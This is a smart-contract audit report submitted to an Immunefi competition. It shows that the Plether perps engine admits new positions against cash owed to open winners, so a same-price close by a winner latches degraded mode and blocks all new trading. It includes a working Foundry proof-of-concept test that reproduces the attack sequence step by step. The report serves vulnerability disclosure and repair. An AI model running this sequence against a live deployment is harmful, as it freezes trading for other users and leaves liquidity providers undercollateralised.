# \#98034 [SC-Medium] Open admission spends cash already owed to open winners, so one same-price close latches degraded mode and blocks all new trading

**Submitted on Nov 4th 2026 at 14:07:57 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98034
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

Before admitting a new position, the engine checks that pool cash covers the largest directional maximum payout plus a small buffer. That check ignores marked profit that existing winners can withdraw at any moment. A new opposite-side position can therefore be admitted against cash that is already owed to a winning trader. When that winner closes at the same price, cash drops below the admitted liability, degraded mode latches, and every trader is blocked from opening or increasing a position until the owner recapitalizes the pool and clears the mode.

## Vulnerability Details

Every risk-increasing open must satisfy the protocol's "buffered entry solvency" invariant, post-op `E >= L + B`, where `E` is pool cash minus trader claims and `L` is the larger directional maximum payout. `CfdEnginePlanLib._applyOpenSettlementBufferAfterPlan` implements it:

```solidity
SolvencyAccountingLib.SolvencyState memory currentState = SolvencyAccountingLib.buildSolvencyState(
    snap.poolCashAssets,
    SolvencyAccountingLib.getMaxLiability(snap.longSide.maxProfitAssets, snap.shortSide.maxProfitAssets),
    snap.totalTraderClaimBalanceAssets
);
// ...
satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets, result.maxLiabilityAfterAssets, snap.settlementBufferBps
);
```

Each side's `maxProfitAssets` is fixed at entry: the long side's sum of entry costs (its payout at basket price zero) and the short side's `lots * CAP_PRICE - entryCost` (its payout at the cap). `getMaxLiability` takes the larger of the two. This netting assumes both sides settle at the same terminal price. It does not hold once one side already has a marked gain that its owner can realize immediately at the current mark, while the other side's maximum payout stays reachable at the opposite endpoint.

Neither input to the check accounts for that gain:

- `E` is physical pool cash minus recorded claims. Profit owed to an open winner is not a claim until the winner closes, so it is still counted as available backing.
- `L` uses entry-based endpoint payouts, so it does not change when the mark moves.

The engine already measures this gain. Its terminal NAV snapshot reports a negative `terminalLpPriceDeltaAssets` (LPs owe traders) before the new open is admitted. Admission simply never consults it.

The resulting sequence, with release parameters:

1. The pool holds 1,000,000 USDG. One trader holds a 400,000-token LONG and another a 600,000-token SHORT, both opened at 1.00 within the 40% skew limit.
2. The basket moves 5% to 1.05 through a normal public Pyth update. The SHORT now holds a marked gain of about 30,000 USDG. The LONG's matching loss is not cash and is only collectible when that position closes.
3. A third trader opens a 560,000-token LONG at 1.05. The long-side maximum payout becomes 988,000 USDG. Admission sees `E = 1,000,694.30` against `L + B = 990,470` and accepts. Its headroom is 10,224 USDG, although the existing winner can withdraw more than twice that.
4. The SHORT closes at 1.05, the same price. `E` falls to 975,309.17 while `L` stays at 988,000: a 12,690.83 USDG shortfall.
5. `CfdEngine._enterDegradedModeIfInsolvent` sees `E < L` and latches degraded mode. A new trader's `commitOrder` now reverts with `OrderRouter__DegradedMode`.

No price changes between the admission and the shortfall. The only event is a legitimate close by a trader whose profit already existed when the open was admitted. The shortfall grows with the winner's marked gain: with a 50% move, the same sequence leaves a 185,857.68 USDG shortfall.

The specification states that admission "must not count unrealized trader losses as spendable assets", but it has no matching rule for unrealized trader gains. Degraded mode is documented as containment when a later transition reveals insolvency, for example after a price move. Here the admission gate itself accepted a position that one already-available transition makes insolvent, which is the case the "buffered entry solvency" invariant exists to prevent.

## Impact Details

The selected in-scope impact is **Smart contract unable to operate due to lack of token funds**.

After the winner's close, pool cash no longer covers the maximum directional liability, so the engine latches degraded mode:

- every new open or increase from every trader reverts at commitment (`OrderRouter__DegradedMode`),
- LP redemption funding is unavailable because it needs `E >= L + B`, and
- only the owner can clear degraded mode, and only once `E >= L` again (`CfdEngine.clearDegradedMode`). That needs a recapitalization or the over-admitted position to close.

The shortfall is also real backing that LPs do not have. If the basket moves toward the admitted position's maximum-payout endpoint, the pool cannot pay that position in full. The gap is exactly the cash that admission counted twice.

No privileged role is involved. Any trader can open the opposite position, and the winning position can belong to anyone, including the same actor. The attacker needs no special timing beyond opening while a large marked gain exists, and pays only ordinary execution fees. The scenario also arises without an attacker whenever a large opposite open lands while winners are in profit.

Every parameter in the PoC is the release value from `packages/perps/DEPLOYMENT.md`. The 5% scenario needs no extreme price move.

## Recommendation

Before admitting new risk, reserve the gains open winners can realize now. For example, subtract the aggregate positive marked price PnL of open positions from effective assets in `_applyOpenSettlementBufferAfterPlan`. Do not net it against unrealized losses, matching the existing rule that unrealized losses are not spendable. Add winner-first settlement permutations to the solvency invariant tests.

## References

- [`CfdEnginePlanLib._applyOpenSettlementBufferAfterPlan`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L698-L779), admission check at [L755-L772](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L755-L772)
- [`SolvencyAccountingLib.getMaxLiability`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/SolvencyAccountingLib.sol#L64-L69) and [`buildSolvencyState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/SolvencyAccountingLib.sol#L133-L148)
- [`CfdEngine._enterDegradedModeIfInsolvent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1368) and owner-only [`clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)
- [Commit-time degraded-mode rejection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L327-L329)
- [`SECURITY.md` buffered entry solvency invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L339)
- [`ACCOUNTING_SPEC.md` liability terms](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L84-L88) and [admission rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L238-L252)
- [`DEPLOYMENT.md` release parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L125-L156)

## Proof of Concept

## Proof of Concept

Every trade is a production V3 `OrderRouter.commitOrder(OrderRequest)` by the trader, followed by a permissionless `OrderRouter.executeOrder`. Mark moves use the permissionless `OrderRouter.updateMarkPrice`. Only Pyth and USDG are mocked. `BasePerpTest` deploys `LegacyOrderRouterHarness`, which inherits the production `OrderRouter` unchanged and only adds a legacy test entry point that this PoC does not use. Risk parameters are the release values; the execution fee, settlement buffer, cap price and 60-second execution window are the unchanged constructor defaults.

Save the following file as `packages/perps/test/perps/accounting/cash-priority/OpenMarkedLiabilityOmission.t.sol` in the frozen repository:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {ProtocolLensViewTypes} from "@plether/perps/interfaces/ProtocolLensViewTypes.sol";

/// @dev Every trade is a production V3 `OrderRouter.commitOrder(OrderRequest)` by the trader, followed by a
///      permissionless `OrderRouter.executeOrder` with a mocked Pyth update. Mark moves use the permissionless
///      `OrderRouter.updateMarkPrice` Pyth path. Only Pyth and USDG are mocked.
contract OpenMarkedLiabilityOmissionPoC is BasePerpTest {

    address internal constant WINNER = address(0xA11CE);
    address internal constant NEW_OPPOSITE = address(0xB0B);
    address internal constant EXISTING_LONG = address(0xC0FFEE);

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md. Execution fee (4 bps), settlement buffer
    ///      (25 bps), CAP_PRICE (2.00) and the 60-second execution window are the unchanged constructor defaults.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 998_000e6;
    }

    /// @notice A 5% basket move on a two-sided book is enough. The new opposite open is admitted against cash the
    ///         existing winner can withdraw at once; the winner's close at the same price latches degraded mode.
    function test_PoC_FivePercentMoveWinnerCloseBreaksAdmittedLiability() public {
        assertEq(pool.totalAssets(), 1_000_000e6, "exact candidate pool cash");
        _fundTrader(EXISTING_LONG, 50_000e6);
        _fundTrader(WINNER, 50_000e6);
        _fundTrader(NEW_OPPOSITE, 50_000e6);

        _trade(EXISTING_LONG, CfdTypes.Side.LONG, 400_000e18, 40_000e6, false, 1e8);
        _trade(WINNER, CfdTypes.Side.SHORT, 600_000e18, 20_000e6, false, 1e8);

        _refreshMarkThroughRouter(1.05e8);
        assertLt(
            engine.terminalNavSnapshot().terminalLpPriceDeltaAssets, 0, "the book owes traders a net marked gain"
        );

        _trade(NEW_OPPOSITE, CfdTypes.Side.LONG, 560_000e18, 20_000e6, false, 1.05e8);
        assertFalse(engine.degradedMode(), "admission accepts the new opposite exposure");
        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory admitted =
            engineProtocolLens.getProtocolAccountingSnapshot();
        emit log_named_decimal_uint("after open: effective assets E", admitted.effectiveSolvencyAssets, 6);
        emit log_named_decimal_uint("after open: max liability L", admitted.maxLiabilityAssets, 6);

        // Same price: the existing winner only realizes the gain it already had when the open was admitted.
        _trade(WINNER, CfdTypes.Side.SHORT, 600_000e18, 0, true, 1.05e8);

        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory accounting =
            engineProtocolLens.getProtocolAccountingSnapshot();
        assertTrue(engine.degradedMode(), "the winner's legitimate same-price close latches degraded mode");
        assertLt(
            accounting.effectiveSolvencyAssets,
            accounting.maxLiabilityAssets,
            "remaining cash no longer backs the admitted endpoint liability"
        );
        emit log_named_decimal_uint("after winner close: E", accounting.effectiveSolvencyAssets, 6);
        emit log_named_decimal_uint(
            "deficit L - E (USDG)", accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets, 6
        );

        _assertNewRiskBlocked();
    }

    /// @notice Larger move: the shortfall scales with the winner's marked gain.
    function test_PoC_WinnerFirstSettlementBreaksNewOppositeLiability() public {
        assertEq(pool.totalAssets(), 1_000_000e6, "exact candidate pool cash");
        _fundTrader(WINNER, 25_000e6);
        _fundTrader(NEW_OPPOSITE, 25_000e6);

        _trade(WINNER, CfdTypes.Side.SHORT, 400_000e18, 20_000e6, false, 1e8);

        _refreshMarkThroughRouter(1.5e8);
        assertLt(
            engine.terminalNavSnapshot().terminalLpPriceDeltaAssets,
            0,
            "the first trader must have an authenticated marked gain"
        );

        _trade(NEW_OPPOSITE, CfdTypes.Side.LONG, 660_000e18, 20_000e6, false, 1.5e8);
        assertFalse(engine.degradedMode(), "the flawed admission path accepts the second open");

        _trade(WINNER, CfdTypes.Side.SHORT, 400_000e18, 0, true, 1.5e8);

        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory accounting =
            engineProtocolLens.getProtocolAccountingSnapshot();
        assertTrue(engine.degradedMode(), "paying the existing winner reveals insolvency");
        assertLt(
            accounting.effectiveSolvencyAssets,
            accounting.maxLiabilityAssets,
            "remaining cash no longer backs the admitted opposite endpoint liability"
        );
        assertGt(
            accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets,
            180_000e6,
            "the deficit is material"
        );
        emit log_named_decimal_uint(
            "deficit L - E (USDG)", accounting.maxLiabilityAssets - accounting.effectiveSolvencyAssets, 6
        );
    }

    /// @dev Any further open is refused at commitment until the owner recapitalizes and clears degraded mode.
    function _assertNewRiskBlocked() internal {
        address newcomer = address(0xD00D);
        _fundTrader(newcomer, 50_000e6);
        OrderV3Types.OrderRequest memory request = _request(CfdTypes.Side.SHORT, 10_000e18, 5_000e6, false);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        vm.prank(newcomer);
        router.commitOrder(request);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint64 orderId = _commit(account, side, size, margin, isClose);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        orderId = router.nextCommitId();
        vm.prank(account);
        router.commitOrder(request);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _refreshMarkThroughRouter(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
        router.updateMarkPrice(updateData);
        assertEq(engine.lastMarkPrice(), price, "public Pyth refresh installs the new mark");
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/accounting/cash-priority/OpenMarkedLiabilityOmission.t.sol -vv
```

Expected output:

```text
Ran 2 tests for test/perps/accounting/cash-priority/OpenMarkedLiabilityOmission.t.sol:OpenMarkedLiabilityOmissionPoC
[PASS] test_PoC_FivePercentMoveWinnerCloseBreaksAdmittedLiability() (gas: 8820846)
Logs:
  after open: effective assets E: 1000694.300615
  after open: max liability L: 988000.000000
  after winner close: E: 975309.173066
  deficit L - E (USDG): 12690.826934

[PASS] test_PoC_WinnerFirstSettlementBreaksNewOppositeLiability() (gas: 6712935)
Logs:
  deficit L - E (USDG): 185857.680052

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
